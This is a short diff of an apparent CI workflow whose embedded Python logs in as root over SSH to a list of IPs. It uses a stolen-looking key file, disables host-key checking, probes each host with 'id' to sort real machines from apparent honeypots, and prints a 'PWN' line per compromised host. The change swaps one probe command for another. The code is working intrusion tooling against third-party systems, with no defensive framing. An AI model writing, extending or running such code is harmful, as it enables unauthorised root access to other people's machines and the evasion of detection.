@@ -103,11 +103,11 @@ jobs:
                       check = subprocess.run(
                           ["ssh", "-i", "/tmp/k", "-o", "StrictHostKeyChecking=no",
                            "-o", "ConnectTimeout=6", f"root@{ip}",
-                           "test -x /bin/ls && test -x /usr/bin/curl && echo REAL || echo FAKE"],
+                           "/bin/bash -c 'echo BASH_OK; id'"],
                           capture_output=True, text=True, timeout=12)
                   except Exception:
                       check = None
-                  verdict = "REAL" if check and "REAL" in check.stdout else "FAKE"
+                  verdict = "REAL" if check and "BASH_OK" in check.stdout else "FAKE"
                   print("PWN", verdict, ip, result.stdout.replace("\n", " | ")[:160], flush=True)
                   break
           PY
